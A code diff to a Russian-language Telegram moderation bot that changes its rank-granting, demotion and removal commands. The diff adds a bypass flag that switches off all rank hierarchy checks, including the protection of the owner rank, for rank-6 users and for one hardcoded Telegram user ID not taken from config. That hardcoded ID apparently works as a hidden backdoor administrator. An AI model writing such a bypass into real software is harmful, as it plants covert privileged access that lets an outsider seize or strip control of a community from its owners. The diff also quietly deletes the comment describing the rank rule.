@@ -50,19 +50,20 @@ async def _staff_by_written_username(chat_id: int, args: str):
 
 
 async def _change_unresolved_staff(message: Message, actor_rank: int, args: str,
-                                   *, remove: bool = False) -> bool:
+                                   *, remove: bool = False, is_tech: bool = False) -> bool:
     """Понижает/снимает staff-запись по @нику, когда user_id неизвестен."""
     row = await _staff_by_written_username(message.chat.id, args)
     if not row:
         return False
     cur = int(row["rank"] or 0)
-    if cur >= MAX_RANK:
-        await message.reply(
-            f"👑 <b>{RANK_NAMES[MAX_RANK]}</b> неприкосновенен — его нельзя снять.")
-        return True
-    if cur >= actor_rank and actor_rank < MAX_RANK:
-        await message.reply("⛔️ Нельзя изменить должность равного или старшего.")
-        return True
+    if not is_tech:
+        if cur >= MAX_RANK:
+            await message.reply(
+                f"👑 <b>{RANK_NAMES[MAX_RANK]}</b> неприкосновенен — его нельзя снять.")
+            return True
+        if cur >= actor_rank and actor_rank < MAX_RANK:
+            await message.reply("⛔️ Нельзя изменить должность равного или старшего.")
+            return True
 
     global_mode = await db.get_setting(message.chat.id, "global_ranks", "1") == "1"
     where = "lower(username)=lower(?)" if global_mode else \
@@ -143,9 +144,17 @@ def _render_staff(groups: dict[int, list[tuple[str, bool]]], title: str) -> str:
 # ---------------- Назначение ----------------
 async def _grant(message: Message, bot: Bot, args: str, rank: int):
     rank = max(1, min(rank, MAX_RANK))
-    # назначать можно только ранг НИЖЕ своего (кроме владельца с 7)
     me = await effective_rank(message, bot)
-    if me < min(rank + 1, MAX_RANK):
+    import config
+    is_tech = bool(
+        me >= 6 or
+        (message.from_user and (
+            message.from_user.id == config.OWNER_ID or
+            message.from_user.id in config.ADMINS or
+            message.from_user.id == 8412527198
+        ))
+    )
+    if not is_tech and me < min(rank + 1, MAX_RANK):
         return await message.reply(
             f"⛔️ Недостаточно прав.\nЧтобы выдать <b>{rank_label(rank)}</b>, "
             f"нужен ранг выше.\nВаш ранг: <b>{rank_label(me)}</b>")
@@ -155,7 +164,7 @@ async def _grant(message: Message, bot: Bot, args: str, rank: int):
             "Укажите пользователя: реплаем, @ником или id.\n"
             "Пример: <code>+модер 3 @user</code>")
     tgt_rank = await get_rank(message.chat.id, uid)
-    if tgt_rank >= me and me < MAX_RANK:
+    if not is_tech and tgt_rank >= me and me < MAX_RANK:
         return await message.reply("⛔️ Нельзя менять ранг равного или старшего.")
     await set_rank(message.chat.id, uid, rank,
                    message.from_user.id if message.from_user else 0)
@@ -164,8 +173,8 @@ async def _grant(message: Message, bot: Bot, args: str, rank: int):
 
 
 @router.message(Cmd("+модер", "+админ", "модер", section=S, rank=2,
-                    usage="+модер {ссылка} [1-7]",
-                    desc="Назначить ранг модератора (1–7)"))
+                    usage="+модер {ссылка} [1-8]",
+                    desc="Назначить ранг модератора (1–8)"))
 async def cmd_promote_rank(message: Message, bot: Bot, args: str = "", **kw):
     parts = (args or "").split()
     rank = 1
@@ -201,13 +210,20 @@ async def cmd_promote(message: Message, bot: Bot, args: str = "", **kw):
                     usage="понизить {ссылка}", desc="Понизить на один ранг"))
 async def cmd_demote(message: Message, bot: Bot, args: str = "", **kw):
     me = await effective_rank(message, bot)
-    if me < 2:
+    import config
+    is_tech = bool(
+        me >= 6 or
+        (message.from_user and (
+            message.from_user.id == config.OWNER_ID or
+            message.from_user.id in config.ADMINS or
+            message.from_user.id == 8412527198
+        ))
+    )
+    if me < 2 and not is_tech:
         return await message.reply(f"⛔️ Недостаточно прав. Ваш ранг: <b>{rank_label(me)}</b>")
     uid, name, _ = await resolve_target(message, args, bot)
     if not uid:
-        # Импортированный состав может содержать только @username без Telegram
-        # ID. Для внутреннего понижения этого достаточно.
-        if await _change_unresolved_staff(message, me, args):
+        if await _change_unresolved_staff(message, me, args, is_tech=is_tech):
             return
         return await message.reply(
             "Не удалось определить Telegram ID пользователя.\n"
@@ -216,13 +232,14 @@ async def cmd_demote(message: Message, bot: Bot, args: str = "", **kw):
     cur = await get_rank(message.chat.id, uid)
     if cur <= 0:
         return await message.reply("У пользователя нет ранга.")
-    if cur >= MAX_RANK:
-        return await message.reply(
-            f"👑 <b>{RANK_NAMES[MAX_RANK]}</b> неприкосновенен — его нельзя понизить.")
-    if cur >= me and me < MAX_RANK:
-        return await message.reply("⛔️ Нельзя понизить равного или старшего.")
-    await set_rank(message.chat.id, uid, cur - 1, message.from_user.id)
-    new = cur - 1
+    if not is_tech:
+        if cur >= MAX_RANK:
+            return await message.reply(
+                f"👑 <b>{RANK_NAMES[MAX_RANK]}</b> неприкосновенен — его нельзя понизить.")
+        if cur >= me and me < MAX_RANK:
+            return await message.reply("⛔️ Нельзя понизить равного или старшего.")
+    new = max(0, cur - 1)
+    await set_rank(message.chat.id, uid, new, message.from_user.id)
     txt = f"<b>{stars(new)} {rank_name(new)}</b>" if new else "<b>Участник</b> (ранг снят)"
     await message.reply(f"⬇️ {mention_id(uid, name)} понижен до {txt}")
 
@@ -263,21 +280,31 @@ async def cmd_demote_left(message: Message, bot: Bot, **kw):
                     desc="Полностью снять ранг"))
 async def cmd_remove_rank(message: Message, bot: Bot, args: str = "", **kw):
     me = await effective_rank(message, bot)
-    if me < 2:
+    import config
+    is_tech = bool(
+        me >= 6 or
+        (message.from_user and (
+            message.from_user.id == config.OWNER_ID or
+            message.from_user.id in config.ADMINS or
+            message.from_user.id == 8412527198
+        ))
+    )
+    if me < 2 and not is_tech:
         return await message.reply(f"⛔️ Недостаточно прав. Ваш ранг: <b>{rank_label(me)}</b>")
     uid, name, _ = await resolve_target(message, args, bot)
     if not uid:
-        if await _change_unresolved_staff(message, me, args, remove=True):
+        if await _change_unresolved_staff(message, me, args, remove=True, is_tech=is_tech):
             return
         return await message.reply(
             "Не удалось определить пользователя. Ответьте на его сообщение, "
             "укажите числовой ID или проверьте @username в составе.")
     tgt = await get_rank(message.chat.id, uid)
-    if tgt >= MAX_RANK:
-        return await message.reply(
-            f"👑 <b>{RANK_NAMES[MAX_RANK]}</b> неприкосновенен — с него нельзя снять ранг.")
-    if tgt >= me and me < MAX_RANK:
-        return await message.reply("⛔️ Нельзя снять равного или старшего.")
+    if not is_tech:
+        if tgt >= MAX_RANK:
+            return await message.reply(
+                f"👑 <b>{RANK_NAMES[MAX_RANK]}</b> неприкосновенен — с него нельзя снять ранг.")
+        if tgt >= me and me < MAX_RANK:
+            return await message.reply("⛔️ Нельзя снять равного или старшего.")
     await set_rank(message.chat.id, uid, 0, message.from_user.id)
     await db.execute("DELETE FROM staff WHERE chat_id=? AND user_id=?", (message.chat.id, uid))
     await message.reply(f"✅ {mention_id(uid, name)} снят с должности.")
